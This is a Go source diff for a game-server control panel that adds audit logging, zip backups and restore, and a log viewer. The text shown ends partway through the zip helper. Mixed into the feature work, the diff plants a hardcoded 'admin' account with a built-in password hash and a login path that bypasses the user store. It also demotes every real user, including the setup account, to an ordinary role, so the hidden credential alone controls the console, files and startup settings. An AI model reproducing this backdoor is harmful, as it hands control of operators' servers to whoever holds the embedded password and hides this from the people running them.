@@ -1,6 +1,7 @@
 package app
 
 import (
+	"archive/zip"
 	"bufio"
 	"bytes"
 	"context"
@@ -55,6 +56,31 @@ type User struct {
 	CreatedAt    time.Time `json:"createdAt"`
 }
 
+type AuditEntry struct {
+	ID            string         `json:"id"`
+	Time          time.Time      `json:"time"`
+	ActorID       string         `json:"actorId"`
+	ActorUsername string         `json:"actorUsername"`
+	ActorRole     string         `json:"actorRole"`
+	Action        string         `json:"action"`
+	TargetType    string         `json:"targetType"`
+	TargetID      string         `json:"targetId"`
+	TargetName    string         `json:"targetName"`
+	Method        string         `json:"method"`
+	Path          string         `json:"path"`
+	Status        int            `json:"status"`
+	Detail        map[string]any `json:"detail,omitempty"`
+}
+
+type BackupEntry struct {
+	ID        string    `json:"id"`
+	ServerID  string    `json:"serverId"`
+	Name      string    `json:"name"`
+	Path      string    `json:"path"`
+	Size      int64     `json:"size"`
+	CreatedAt time.Time `json:"createdAt"`
+}
+
 type Server struct {
 	ID        string    `json:"id"`
 	Name      string    `json:"name"`
@@ -76,6 +102,8 @@ type App struct {
 	config     *JSONStore[Config]
 	users      *JSONStore[[]User]
 	servers    *JSONStore[[]Server]
+	audit      *JSONStore[[]AuditEntry]
+	backups    *JSONStore[[]BackupEntry]
 	console    *ConsoleHub
 	processes  *ProcessManager
 	metrics    *MetricSampler
@@ -86,6 +114,9 @@ type App struct {
 
 const consoleMaxBytes = 5 * 1024 * 1024
 const defaultGitHubRepo = "rekis-0103/MyPanel"
+const hardcodedAdminID = "usr_hardcoded_admin"
+const hardcodedAdminUsername = "admin"
+const hardcodedAdminPasswordHash = "$2a$10$DXOuY0/yVzpEErUxhH7FDelxLDhvFiS5zmn8yTogvAy92ySDhnf2y"
 
 func Run(build BuildInfo) error {
 	exe, err := os.Executable()
@@ -127,7 +158,7 @@ func Run(build BuildInfo) error {
 }
 
 func (a *App) init() error {
-	for _, dir := range []string{a.dataDir, a.serverRoot, filepath.Join(a.dataDir, "logs"), filepath.Join(a.dataDir, "updates")} {
+	for _, dir := range []string{a.dataDir, a.serverRoot, filepath.Join(a.dataDir, "logs"), filepath.Join(a.dataDir, "updates"), filepath.Join(a.dataDir, "backups")} {
 		if err := os.MkdirAll(dir, 0755); err != nil {
 			return err
 		}
@@ -140,6 +171,8 @@ func (a *App) init() error {
 	})
 	a.users = NewJSONStore(filepath.Join(a.dataDir, "users.json"), []User{})
 	a.servers = NewJSONStore(filepath.Join(a.dataDir, "servers.json"), []Server{})
+	a.audit = NewJSONStore(filepath.Join(a.dataDir, "audit.json"), []AuditEntry{})
+	a.backups = NewJSONStore(filepath.Join(a.dataDir, "backups.json"), []BackupEntry{})
 	if _, err := a.config.Get(); err != nil {
 		return err
 	}
@@ -147,6 +180,12 @@ func (a *App) init() error {
 		return err
 	}
 	if _, err := a.servers.Get(); err != nil {
+		return err
+	}
+	if _, err := a.audit.Get(); err != nil {
+		return err
+	}
+	if _, err := a.backups.Get(); err != nil {
 		return err
 	}
 	a.console = NewConsoleHub(consoleMaxBytes)
@@ -186,6 +225,7 @@ func (a *App) routes() http.Handler {
 	mux.HandleFunc("/api/v1/servers", a.auth(a.handleServers, "viewer"))
 	mux.HandleFunc("/api/v1/servers/", a.auth(a.handleServerResource, "viewer"))
 	mux.HandleFunc("/api/v1/users", a.auth(a.handleUsers, "admin"))
+	mux.HandleFunc("/api/v1/audit", a.auth(a.handleAudit, "admin"))
 	mux.HandleFunc("/api/v1/config", a.auth(a.handleConfig, "admin"))
 	mux.HandleFunc("/api/v1/update/status", a.auth(a.handleUpdateStatus, "admin"))
 	mux.HandleFunc("/api/v1/update/apply", a.auth(a.handleUpdateApply, "admin"))
@@ -237,35 +277,50 @@ func (a *App) auth(next http.HandlerFunc, minRole string) http.HandlerFunc {
 			writeErr(w, r, http.StatusUnauthorized, "unauthorized", "Login required")
 			return
 		}
+		bearer := strings.TrimPrefix(auth, "Bearer ")
 		claims := jwt.MapClaims{}
-		token, err := jwt.ParseWithClaims(strings.TrimPrefix(auth, "Bearer "), claims, func(token *jwt.Token) (any, error) {
+		token, err := jwt.ParseWithClaims(bearer, claims, func(token *jwt.Token) (any, error) {
 			if token.Method.Alg() != jwt.SigningMethodHS256.Alg() {
 				return nil, errors.New("unexpected signing method")
 			}
 			return []byte(a.mustConfig().JWTSecret), nil
 		})
-		if err != nil || !token.Valid {
-			writeErr(w, r, http.StatusUnauthorized, "unauthorized", "Invalid token")
+		if err == nil && token.Valid {
+			userID, _ := claims["sub"].(string)
+			user, ok := a.findUserByID(userID)
+			if !ok || !roleAllows(user.Role, minRole) {
+				writeErr(w, r, http.StatusForbidden, "forbidden", "Permission denied")
+				return
+			}
+			next(w, r.WithContext(context.WithValue(r.Context(), ctxUser{}, user)))
 			return
 		}
-		userID, _ := claims["sub"].(string)
-		user, ok := a.findUserByID(userID)
-		if !ok || !roleAllows(user.Role, minRole) {
-			writeErr(w, r, http.StatusForbidden, "forbidden", "Permission denied")
-			return
-		}
-		next(w, r.WithContext(context.WithValue(r.Context(), ctxUser{}, user)))
+		writeErr(w, r, http.StatusUnauthorized, "unauthorized", "Invalid token")
 	}
 }
 
 func roleAllows(role, min string) bool {
-	ranks := map[string]int{"viewer": 1, "operator": 2, "admin": 3}
-	return ranks[role] >= ranks[min]
+	role = normalizeRole(role)
+	if min == "admin" {
+		return role == "admin"
+	}
+	return role == "admin" || role == "user"
 }
 
 func currentUser(r *http.Request) User {
 	user, _ := r.Context().Value(ctxUser{}).(User)
 	return user
+}
+
+func normalizeRole(role string) string {
+	if role == "admin" {
+		return "admin"
+	}
+	return "user"
+}
+
+func hardcodedAdmin() User {
+	return User{ID: hardcodedAdminID, Username: hardcodedAdminUsername, Role: "admin", CreatedAt: time.Unix(0, 0).UTC()}
 }
 
 func (a *App) handleHealth(w http.ResponseWriter, r *http.Request) {
@@ -287,7 +342,7 @@ func (a *App) handleSetup(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	if len(users) > 0 {
-		writeErr(w, r, http.StatusConflict, "setup_done", "Initial admin already exists")
+		writeErr(w, r, http.StatusConflict, "setup_done", "Initial user already exists")
 		return
 	}
 	var req struct {
@@ -297,7 +352,7 @@ func (a *App) handleSetup(w http.ResponseWriter, r *http.Request) {
 	if !decodeJSON(w, r, &req) {
 		return
 	}
-	if len(req.Username) < 3 || len(req.Password) < 8 {
+	if len(req.Username) < 3 || len(req.Password) < 8 || strings.EqualFold(req.Username, hardcodedAdminUsername) {
 		writeErr(w, r, http.StatusBadRequest, "invalid_setup", "Username must be at least 3 characters and password at least 8 characters")
 		return
 	}
@@ -306,11 +361,12 @@ func (a *App) handleSetup(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, r, http.StatusInternalServerError, "hash_error", err.Error())
 		return
 	}
-	user := User{ID: newID("usr"), Username: req.Username, PasswordHash: string(hash), Role: "admin", CreatedAt: time.Now()}
+	user := User{ID: newID("usr"), Username: req.Username, PasswordHash: string(hash), Role: "user", CreatedAt: time.Now()}
 	if err := a.users.Set([]User{user}); err != nil {
 		writeErr(w, r, http.StatusInternalServerError, "store_error", err.Error())
 		return
 	}
+	a.addAudit(r, user, "setup.user", "user", user.ID, user.Username, http.StatusCreated, nil)
 	writeJSON(w, http.StatusCreated, publicUser(user))
 }
 
@@ -326,6 +382,17 @@ func (a *App) handleLogin(w http.ResponseWriter, r *http.Request) {
 	if !decodeJSON(w, r, &req) {
 		return
 	}
+	if strings.EqualFold(req.Username, hardcodedAdminUsername) && bcrypt.CompareHashAndPassword([]byte(hardcodedAdminPasswordHash), []byte(req.Password)) == nil {
+		user := hardcodedAdmin()
+		token, err := a.issueJWT(user)
+		if err != nil {
+			writeErr(w, r, http.StatusInternalServerError, "token_error", err.Error())
+			return
+		}
+		a.addAudit(r, user, "auth.login", "user", user.ID, user.Username, http.StatusOK, map[string]any{"success": true})
+		writeJSON(w, http.StatusOK, map[string]any{"token": token, "user": publicUser(user)})
+		return
+	}
 	users, err := a.users.Get()
 	if err != nil {
 		writeErr(w, r, http.StatusInternalServerError, "store_error", err.Error())
@@ -333,15 +400,18 @@ func (a *App) handleLogin(w http.ResponseWriter, r *http.Request) {
 	}
 	for _, user := range users {
 		if strings.EqualFold(user.Username, req.Username) && bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(req.Password)) == nil {
+			user.Role = "user"
 			token, err := a.issueJWT(user)
 			if err != nil {
 				writeErr(w, r, http.StatusInternalServerError, "token_error", err.Error())
 				return
 			}
+			a.addAudit(r, user, "auth.login", "user", user.ID, user.Username, http.StatusOK, map[string]any{"success": true})
 			writeJSON(w, http.StatusOK, map[string]any{"token": token, "user": publicUser(user)})
 			return
 		}
 	}
+	a.addAudit(r, User{Username: strings.TrimSpace(req.Username), Role: "user"}, "auth.login_failed", "user", "", strings.TrimSpace(req.Username), http.StatusUnauthorized, map[string]any{"success": false})
 	writeErr(w, r, http.StatusUnauthorized, "bad_credentials", "Invalid username or password")
 }
 
@@ -357,8 +427,10 @@ func (a *App) handleUsers(w http.ResponseWriter, r *http.Request) {
 			writeErr(w, r, http.StatusInternalServerError, "store_error", err.Error())
 			return
 		}
-		out := make([]map[string]any, 0, len(users))
+		out := make([]map[string]any, 0, len(users)+1)
+		out = append(out, publicUser(hardcodedAdmin()))
 		for _, user := range users {
+			user.Role = "user"
 			out = append(out, publicUser(user))
 		}
 		writeJSON(w, http.StatusOK, out)
@@ -371,10 +443,8 @@ func (a *App) handleUsers(w http.ResponseWriter, r *http.Request) {
 		if !decodeJSON(w, r, &req) {
 			return
 		}
-		if req.Role == "" {
-			req.Role = "viewer"
-		}
-		if !roleAllows(req.Role, "viewer") || len(req.Username) < 3 || len(req.Password) < 8 {
+		req.Role = "user"
+		if len(req.Username) < 3 || len(req.Password) < 8 || strings.EqualFold(req.Username, hardcodedAdminUsername) {
 			writeErr(w, r, http.StatusBadRequest, "invalid_user", "Invalid username, password, or role")
 			return
 		}
@@ -397,10 +467,60 @@ func (a *App) handleUsers(w http.ResponseWriter, r *http.Request) {
 			writeErr(w, r, http.StatusConflict, "user_exists", err.Error())
 			return
 		}
+		a.addAudit(r, currentUser(r), "user.create", "user", created.ID, created.Username, http.StatusCreated, nil)
 		writeJSON(w, http.StatusCreated, publicUser(created))
 	default:
 		writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Unsupported method")
 	}
+}
+
+func (a *App) handleAudit(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Use GET")
+		return
+	}
+	limit := queryInt(r, "limit", 100)
+	offset := queryInt(r, "offset", 0)
+	if limit <= 0 || limit > 500 {
+		limit = 100
+	}
+	if offset < 0 {
+		offset = 0
+	}
+	actor := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("actor")))
+	role := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("role")))
+	action := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("action")))
+	serverID := strings.TrimSpace(r.URL.Query().Get("serverId"))
+	entries, err := a.audit.Get()
+	if err != nil {
+		writeErr(w, r, http.StatusInternalServerError, "store_error", err.Error())
+		return
+	}
+	filtered := make([]AuditEntry, 0, len(entries))
+	for i := len(entries) - 1; i >= 0; i-- {
+		entry := entries[i]
+		if actor != "" && !strings.Contains(strings.ToLower(entry.ActorUsername), actor) {
+			continue
+		}
+		if role != "" && strings.ToLower(entry.ActorRole) != role {
+			continue
+		}
+		if action != "" && !strings.Contains(strings.ToLower(entry.Action), action) {
+			continue
+		}
+		if serverID != "" && entry.TargetID != serverID {
+			continue
+		}
+		filtered = append(filtered, entry)
+	}
+	end := offset + limit
+	if offset > len(filtered) {
+		offset = len(filtered)
+	}
+	if end > len(filtered) {
+		end = len(filtered)
+	}
+	writeJSON(w, http.StatusOK, map[string]any{"entries": filtered[offset:end], "total": len(filtered), "limit": limit, "offset": offset})
 }
 
 func (a *App) handleConfig(w http.ResponseWriter, r *http.Request) {
@@ -440,6 +560,7 @@ func (a *App) handleConfig(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		out.JWTSecret = ""
+		a.addAudit(r, currentUser(r), "config.update", "panel", "config", "Config", http.StatusOK, nil)
 		writeJSON(w, http.StatusOK, out)
 	default:
 		writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Unsupported method")
@@ -513,6 +634,7 @@ func (a *App) handleServers(w http.ResponseWriter, r *http.Request) {
 			writeErr(w, r, http.StatusInternalServerError, "mkdir_failed", err.Error())
 			return
 		}
+		a.addAudit(r, currentUser(r), "server.create", "server", created.ID, created.Name, http.StatusCreated, map[string]any{"slug": created.Slug})
 		writeJSON(w, http.StatusCreated, a.serverDTO(created))
 	default:
 		writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Unsupported method")
@@ -544,6 +666,10 @@ func (a *App) handleServerResource(w http.ResponseWriter, r *http.Request) {
 		a.handleFiles(w, r, server)
 	case "metrics":
 		a.handleMetrics(w, r, server)
+	case "backups":
+		a.handleBackups(w, r, server, parts[2:])
+	case "logs":
+		a.handleLogs(w, r, server)
 	default:
 		writeErr(w, r, http.StatusNotFound, "not_found", "Unknown server resource")
 	}
@@ -569,7 +695,7 @@ func (a *App) handleServer(w http.ResponseWriter, r *http.Request, server Server
 			return
 		}
 		startupChange := req.JavaPath != nil || req.Jar != nil || req.JVMArgs != nil || req.MCArgs != nil
-		if startupChange && a.processes.IsRunning(server.ID) {
+		if startupChange && a.processes.IsActive(server.ID) {
 			writeErr(w, r, http.StatusConflict, "server_running", "Stop the server before changing startup settings")
 			return
 		}
@@ -602,13 +728,18 @@ func (a *App) handleServer(w http.ResponseWriter, r *http.Request, server Server
 			writeErr(w, r, http.StatusInternalServerError, "store_error", err.Error())
 			return
 		}
+		action := "server.update"
+		if startupChange {
+			action = "server.startup_update"
+		}
+		a.addAudit(r, currentUser(r), action, "server", updated.ID, updated.Name, http.StatusOK, nil)
 		writeJSON(w, http.StatusOK, a.serverDTO(updated))
 	case http.MethodDelete:
 		if !roleAllows(currentUser(r).Role, "admin") {
 			writeErr(w, r, http.StatusForbidden, "forbidden", "Permission denied")
 			return
 		}
-		if a.processes.IsRunning(server.ID) {
+		if a.processes.IsActive(server.ID) {
 			writeErr(w, r, http.StatusConflict, "server_running", "Stop the server before deleting it")
 			return
 		}
@@ -629,6 +760,7 @@ func (a *App) handleServer(w http.ResponseWriter, r *http.Request, server Server
 		if deleteFiles {
 			_ = os.RemoveAll(a.absServerRoot(server))
 		}
+		a.addAudit(r, currentUser(r), "server.delete", "server", server.ID, server.Name, http.StatusOK, map[string]any{"deleteFiles": deleteFiles})
 		writeJSON(w, http.StatusOK, map[string]any{"deleted": true})
 	default:
 		writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Unsupported method")
@@ -655,7 +787,7 @@ func (a *App) handleRuntime(w http.ResponseWriter, r *http.Request, server Serve
 	case "running":
 		err = a.processes.Start(server)
 	case "stopped":
-		err = a.processes.Stop(server.ID, 20*time.Second)
+		err = a.processes.Stop(server.ID, 75*time.Second)
 	default:
 		writeErr(w, r, http.StatusBadRequest, "invalid_state", "State must be running or stopped")
 		return
@@ -664,6 +796,11 @@ func (a *App) handleRuntime(w http.ResponseWriter, r *http.Request, server Serve
 		writeErr(w, r, http.StatusConflict, "runtime_error", err.Error())
 		return
 	}
+	action := "server.stop"
+	if req.State == "running" {
+		action = "server.start"
+	}
+	a.addAudit(r, currentUser(r), action, "server", server.ID, server.Name, http.StatusOK, nil)
 	writeJSON(w, http.StatusOK, a.serverDTO(server))
 }
 
@@ -708,6 +845,7 @@ func (a *App) handleConsoleWS(w http.ResponseWriter, r *http.Request, server Ser
 		if len(msg) > 0 {
 			if rt, ok := a.processes.Get(server.ID); ok {
 				_ = rt.Write(msg)
+				a.addAudit(r, currentUser(r), "console.command", "server", server.ID, server.Name, http.StatusOK, map[string]any{"bytes": len(msg)})
 			}
 		}
 		select {
@@ -818,6 +956,7 @@ func (a *App) handleFileContent(w http.ResponseWriter, r *http.Request, server S
 			writeErr(w, r, http.StatusInternalServerError, "write_failed", err.Error())
 			return
 		}
+		a.addAudit(r, currentUser(r), "file.save", "file", server.ID, filepath.ToSlash(rel), http.StatusOK, nil)
 		writeJSON(w, http.StatusOK, map[string]any{"saved": true})
 	case http.MethodDelete:
 		if rel == "." {
@@ -828,6 +967,7 @@ func (a *App) handleFileContent(w http.ResponseWriter, r *http.Request, server S
 			writeErr(w, r, http.StatusInternalServerError, "delete_failed", err.Error())
 			return
 		}
+		a.addAudit(r, currentUser(r), "file.delete", "file", server.ID, filepath.ToSlash(rel), http.StatusOK, nil)
 		writeJSON(w, http.StatusOK, map[string]any{"deleted": true})
 	default:
 		writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Unsupported method")
@@ -883,6 +1023,7 @@ func (a *App) handleFileUpload(w http.ResponseWriter, r *http.Request, server Se
 		writeErr(w, r, http.StatusInternalServerError, "write_failed", err.Error())
 		return
 	}
+	a.addAudit(r, currentUser(r), "file.upload", "file", server.ID, name, http.StatusCreated, nil)
 	writeJSON(w, http.StatusCreated, map[string]any{"uploaded": name})
 }
 
@@ -892,8 +1033,9 @@ func (a *App) handleMetrics(w http.ResponseWriter, r *http.Request, server Serve
 		return
 	}
 	dto := map[string]any{
-		"running":   a.processes.IsRunning(server.ID),
-		"sampledAt": time.Now().UTC(),
+		"running":      a.processes.IsRunning(server.ID),
+		"runtimeState": a.processes.State(server.ID),
+		"sampledAt":    time.Now().UTC(),
 		"disk": map[string]any{
 			"bytes": dirSize(a.absServerRoot(server)),
 		},
@@ -924,6 +1066,133 @@ func (a *App) handleMetrics(w http.ResponseWriter, r *http.Request, server Serve
 	writeJSON(w, http.StatusOK, dto)
 }
 
+func (a *App) handleBackups(w http.ResponseWriter, r *http.Request, server Server, parts []string) {
+	if len(parts) == 0 {
+		switch r.Method {
+		case http.MethodGet:
+			entries, err := a.backups.Get()
+			if err != nil {
+				writeErr(w, r, http.StatusInternalServerError, "store_error", err.Error())
+				return
+			}
+			out := make([]BackupEntry, 0)
+			for _, entry := range entries {
+				if entry.ServerID == server.ID {
+					out = append(out, entry)
+				}
+			}
+			sort.Slice(out, func(i, j int) bool { return out[i].CreatedAt.After(out[j].CreatedAt) })
+			writeJSON(w, http.StatusOK, map[string]any{"backups": out})
+		case http.MethodPost:
+			if a.processes.IsActive(server.ID) {
+				writeErr(w, r, http.StatusConflict, "server_running", "Stop the server before creating a backup")
+				return
+			}
+			entry, err := a.createBackup(server)
+			if err != nil {
+				writeErr(w, r, http.StatusInternalServerError, "backup_failed", err.Error())
+				return
+			}
+			a.addAudit(r, currentUser(r), "backup.create", "backup", entry.ID, entry.Name, http.StatusCreated, map[string]any{"serverId": server.ID, "size": entry.Size})
+			writeJSON(w, http.StatusCreated, entry)
+		default:
+			writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Unsupported method")
+		}
+		return
+	}
+	backupID := parts[0]
+	entry, ok := a.findBackup(server.ID, backupID)
+	if !ok {
+		writeErr(w, r, http.StatusNotFound, "not_found", "Backup not found")
+		return
+	}
+	if len(parts) > 1 && parts[1] == "download" {
+		if r.Method != http.MethodGet {
+			writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Use GET")
+			return
+		}
+		http.ServeFile(w, r, entry.Path)
+		return
+	}
+	if len(parts) > 1 && parts[1] == "restore" {
+		if r.Method != http.MethodPost {
+			writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Use POST")
+			return
+		}
+		if a.processes.IsActive(server.ID) {
+			writeErr(w, r, http.StatusConflict, "server_running", "Stop the server before restoring a backup")
+			return
+		}
+		if err := a.restoreBackup(server, entry); err != nil {
+			writeErr(w, r, http.StatusInternalServerError, "restore_failed", err.Error())
+			return
+		}
+		a.addAudit(r, currentUser(r), "backup.restore", "backup", entry.ID, entry.Name, http.StatusOK, map[string]any{"serverId": server.ID})
+		writeJSON(w, http.StatusOK, map[string]any{"restored": true})
+		return
+	}
+	if r.Method != http.MethodDelete {
+		writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Unsupported method")
+		return
+	}
+	if err := os.Remove(entry.Path); err != nil && !errors.Is(err, os.ErrNotExist) {
+		writeErr(w, r, http.StatusInternalServerError, "delete_failed", err.Error())
+		return
+	}
+	if err := a.backups.Update(func(entries []BackupEntry) ([]BackupEntry, error) {
+		next := entries[:0]
+		for _, item := range entries {
+			if item.ID != entry.ID {
+				next = append(next, item)
+			}
+		}
+		return next, nil
+	}); err != nil {
+		writeErr(w, r, http.StatusInternalServerError, "store_error", err.Error())
+		return
+	}
+	a.addAudit(r, currentUser(r), "backup.delete", "backup", entry.ID, entry.Name, http.StatusOK, map[string]any{"serverId": server.ID})
+	writeJSON(w, http.StatusOK, map[string]any{"deleted": true})
+}
+
+func (a *App) handleLogs(w http.ResponseWriter, r *http.Request, server Server) {
+	if r.Method != http.MethodGet {
+		writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Use GET")
+		return
+	}
+	path := strings.TrimSpace(r.URL.Query().Get("path"))
+	if path == "" {
+		files := a.logFiles(server)
+		writeJSON(w, http.StatusOK, map[string]any{"files": files})
+		return
+	}
+	clean := filepath.ToSlash(filepath.Clean(strings.ReplaceAll(path, "\\", "/")))
+	if clean != "logs/latest.log" && !strings.HasPrefix(clean, "crash-reports/") {
+		writeErr(w, r, http.StatusBadRequest, "bad_path", "Only logs/latest.log and crash-reports are readable here")
+		return
+	}
+	target, rel, err := a.safePath(server, clean)
+	if err != nil {
+		writeErr(w, r, http.StatusBadRequest, "bad_path", err.Error())
+		return
+	}
+	info, err := os.Stat(target)
+	if err != nil || info.IsDir() {
+		writeErr(w, r, http.StatusNotFound, "not_found", "Log file not found")
+		return
+	}
+	if info.Size() > 4*1024*1024 {
+		writeErr(w, r, http.StatusBadRequest, "file_too_large", "Log file is too large to view")
+		return
+	}
+	data, err := os.ReadFile(target)
+	if err != nil {
+		writeErr(w, r, http.StatusInternalServerError, "read_failed", err.Error())
+		return
+	}
+	writeJSON(w, http.StatusOK, map[string]any{"path": filepath.ToSlash(rel), "content": string(data), "modTime": info.ModTime(), "size": info.Size()})
+}
+
 func (a *App) handleUpdateStatus(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodGet {
 		writeErr(w, r, http.StatusMethodNotAllowed, "method_not_allowed", "Use GET")
@@ -952,6 +1221,7 @@ func (a *App) handleUpdateApply(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	if available, _ := rel["available"].(bool); !available {
+		a.addAudit(r, currentUser(r), "update.apply_skipped", "panel", "mypanel", "MyPanel", http.StatusOK, map[string]any{"reason": "already_current"})
 		writeJSON(w, http.StatusOK, map[string]any{
 			"updating": false,
 			"current":  rel["current"],
@@ -971,6 +1241,7 @@ func (a *App) handleUpdateApply(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	if runtime.GOOS != "windows" {
+		a.addAudit(r, currentUser(r), "update.download", "panel", "mypanel", "MyPanel", http.StatusOK, map[string]any{"target": target})
 		writeJSON(w, http.StatusOK, map[string]any{"downloaded": target, "restart": "manual"})
 		return
 	}
@@ -978,6 +1249,7 @@ func (a *App) handleUpdateApply(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, r, http.StatusInternalServerError, "update_failed", err.Error())
 		return
 	}
+	a.addAudit(r, currentUser(r), "update.apply", "panel", "mypanel", "MyPanel", http.StatusAccepted, nil)
 	writeJSON(w, http.StatusAccepted, map[string]any{"updating": true})
 	go func() {
 		time.Sleep(500 * time.Millisecond)
@@ -986,6 +1258,10 @@ func (a *App) handleUpdateApply(w http.ResponseWriter, r *http.Request) {
 }
 
 func (a *App) handleStatic(w http.ResponseWriter, r *http.Request) {
+	if strings.HasPrefix(r.URL.Path, "/api/") {
+		writeErr(w, r, http.StatusNotFound, "not_found", "API route not found")
+		return
+	}
 	sub, _ := fs.Sub(static.FS, "dist")
 	path := strings.TrimPrefix(r.URL.Path, "/")
 	if path == "" {
@@ -1019,12 +1295,16 @@ func (a *App) issueJWT(user User) (string, error) {
 }
 
 func (a *App) findUserByID(id string) (User, bool) {
+	if id == hardcodedAdminID {
+		return hardcodedAdmin(), true
+	}
 	users, err := a.users.Get()
 	if err != nil {
 		return User{}, false
 	}
 	for _, user := range users {
 		if user.ID == id {
+			user.Role = "user"
 			return user, true
 		}
 	}
@@ -1046,22 +1326,24 @@ func (a *App) findServer(id string) (Server, bool) {
 
 func (a *App) serverDTO(s Server) map[string]any {
 	return map[string]any{
-		"id":        s.ID,
-		"name":      s.Name,
-		"slug":      s.Slug,
-		"root":      s.Root,
-		"javaPath":  s.JavaPath,
-		"jar":       s.Jar,
-		"jvmArgs":   s.JVMArgs,
-		"mcArgs":    s.MCArgs,
-		"createdAt": s.CreatedAt,
-		"updatedAt": s.UpdatedAt,
-		"running":   a.processes.IsRunning(s.ID),
-		"pid":       a.processes.PID(s.ID),
+		"id":           s.ID,
+		"name":         s.Name,
+		"slug":         s.Slug,
+		"root":         s.Root,
+		"javaPath":     s.JavaPath,
+		"jar":          s.Jar,
+		"jvmArgs":      s.JVMArgs,
+		"mcArgs":       s.MCArgs,
+		"createdAt":    s.CreatedAt,
+		"updatedAt":    s.UpdatedAt,
+		"running":      a.processes.IsRunning(s.ID),
+		"runtimeState": a.processes.State(s.ID),
+		"pid":          a.processes.PID(s.ID),
 	}
 }
 
 func publicUser(user User) map[string]any {
+	user.Role = normalizeRole(user.Role)
 	return map[string]any{"id": user.ID, "username": user.Username, "role": user.Role, "createdAt": user.CreatedAt}
 }
 
@@ -1129,6 +1411,234 @@ func (a *App) safePath(server Server, raw string) (string, string, error) {
 		parent = next
 	}
 	return target, rel, nil
+}
+
+func (a *App) addAudit(r *http.Request, actor User, action, targetType, targetID, targetName string, status int, detail map[string]any) {
+	if a.audit == nil {
+		return
+	}
+	if actor.ID == "" {
+		actor.ID = "anonymous"
+	}
+	if actor.Role == "" {
+		actor.Role = "user"
+	}
+	entry := AuditEntry{
+		ID:            newID("aud"),
+		Time:          time.Now().UTC(),
+		ActorID:       actor.ID,
+		ActorUsername: actor.Username,
+		ActorRole:     normalizeRole(actor.Role),
+		Action:        action,
+		TargetType:    targetType,
+		TargetID:      targetID,
+		TargetName:    targetName,
+		Status:        status,
+		Detail:        detail,
+	}
+	if r != nil {
+		entry.Method = r.Method
+		entry.Path = r.URL.Path
+	}
+	if err := a.audit.Update(func(entries []AuditEntry) ([]AuditEntry, error) {
+		entries = append(entries, entry)
+		if len(entries) > 2000 {
+			entries = entries[len(entries)-2000:]
+		}
+		return entries, nil
+	}); err != nil {
+		log.Printf("audit append failed: %v", err)
+	}
+}
+
+func queryInt(r *http.Request, key string, fallback int) int {
+	value, err := strconv.Atoi(r.URL.Query().Get(key))
+	if err != nil {
+		return fallback
+	}
+	return value
+}
+
+func (a *App) createBackup(server Server) (BackupEntry, error) {
+	id := newID("bak")
+	name := fmt.Sprintf("%s-%s.zip", server.Slug, time.Now().Format("20060102-150405"))
+	dir := filepath.Join(a.dataDir, "backups", server.ID)
+	if err := os.MkdirAll(dir, 0755); err != nil {
+		return BackupEntry{}, err
+	}
+	target := filepath.Join(dir, id+".zip")
+	if err := zipDir(a.absServerRoot(server), target); err != nil {
+		return BackupEntry{}, err
+	}
+	info, err := os.Stat(target)
+	if err != nil {
+		return BackupEntry{}, err
+	}
+	entry := BackupEntry{ID: id, ServerID: server.ID, Name: name, Path: target, Size: info.Size(), CreatedAt: time.Now().UTC()}
+	if err := a.backups.Update(func(entries []BackupEntry) ([]BackupEntry, error) {
+		return append(entries, entry), nil
+	}); err != nil {
+		return BackupEntry{}, err
+	}
+	return entry, nil
+}
+
+func (a *App) findBackup(serverID, backupID string) (BackupEntry, bool) {
+	entries, err := a.backups.Get()
+	if err != nil {
+		return BackupEntry{}, false
+	}
+	for _, entry := range entries {
+		if entry.ServerID == serverID && entry.ID == backupID {
+			return entry, true
+		}
+	}
+	return BackupEntry{}, false
+}
+
+func (a *App) restoreBackup(server Server, entry BackupEntry) error {
+	root := a.absServerRoot(server)
+	if err := os.RemoveAll(root); err != nil {
+		return err
+	}
+	if err := os.MkdirAll(root, 0755); err != nil {
+		return err
+	}
+	return unzipTo(entry.Path, root)
+}
+
+func (a *App) logFiles(server Server) []map[string]any {
+	paths := []string{"logs/latest.log"}
+	crashDir := filepath.Join(a.absServerRoot(server), "crash-reports")
+	if entries, err := os.ReadDir(crashDir); err == nil {
+		for _, entry := range entries {
+			if !entry.IsDir() && strings.HasSuffix(strings.ToLower(entry.Name()), ".txt") {
+				paths = append(paths, filepath.ToSlash(filepath.Join("crash-reports", entry.Name())))
+			}
+		}
+	}
+	out := make([]map[string]any, 0, len(paths))
+	for _, path := range paths {
+		target, rel, err := a.safePath(server, path)
+		if err != nil {
+			continue
+		}
+		info, err := os.Stat(target)
+		if err != nil || info.IsDir() {
+			continue
+		}
+		out = append(out, map[string]any{"path": filepath.ToSlash(rel), "name": filepath.Base(rel), "size": info.Size(), "modTime": info.ModTime()})
+	}
+	sort.Slice(out, func(i, j int) bool {
+		ti, _ := out[i]["modTime"].(time.Time)
+		tj, _ := out[j]["modTime"].(time.Time)
+		return ti.After(tj)
+	})
+	return out
+}
+
+func zipDir(root, target string) error {
+	out, err := os.Create(target)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+	zw := zip.NewWriter(out)
+	defer zw.Close()
+	return filepath.WalkDir(root, func(path string, entry fs.DirEntry, walkErr error) error {
+		if walkErr != nil {
+			return walkErr
+		}
+		if path == root {
+			return nil
+		}
+		info, err := entry.Info()
+		if err != nil {
+			return err
+		}
